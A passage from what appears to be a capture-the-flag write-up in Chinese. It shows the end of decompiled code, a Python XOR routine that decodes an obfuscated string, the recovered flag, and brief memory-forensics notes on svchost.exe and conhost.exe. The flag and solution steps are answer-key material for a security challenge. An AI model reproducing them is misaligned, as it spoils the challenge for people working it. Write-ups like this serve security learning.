  return MessageBoxA(0, "Hacked by ptr-yudai", Caption, 0x40u);
}
```

decode 時要注意的一點是，**TEXT 的 value 是已經做過 decode 的 value**，所以要逆向做回去:

```python
#!/usr/bin/python3                                                                                      

text = b'\x85\x80\x83\x94\x9c\x90\x80\x93\xad\x82\xab\xbc\x85\x9a\xba\xa9\xbb\xad\xbf\xa7\x90\x86\x81\xba\xa7\x95\x8a\x80\x9e\x99\x8d\x9f\x97\xb0\xb3\x9e\x96\x96\xab\xb0\x8e\x92\x9b\x8c\x8e\x92\x93\x93\x83'

text2 = b""
for i in range(len(text)):
    text2 += bytes([text[i] ^ ((len(text) - i) ^ 0xff)])
 
print(text2)

text3 = b""
for i in range(len(text)):
    text3 += bytes([i ^ (0xff ^ text2[i])])
 
print(text3)
```

解開後就是 flag `KOSENCTF{Use_After_Free_Arbitrary_Code_Execution}`。



- memdump 似乎都是用 `DumpIt.exe` 產生 `memdump.raw`
- `svchost.exe`
  - 微軟的視窗作業系統裡專門用來執行 DLL 程式的前導程式
  - 正確的位置應該位於作業系統盤根目錄的\Windows\system32目錄下（64位元系統則亦在系統磁碟根目錄的\Windows\SysWOW64）。如果在其他地方看到，那麼很可能是病毒程式
- `\??\C:\Windows\system32\conhost.exe 0x4`
  - `\??\` paths are special pseudo-folders called NT Object Manager object names
  - `conhost.exe` is the Console Host of Windows
  - usually invoked by `csrss.exe` which is also one of those modules which need to use kernel mode names
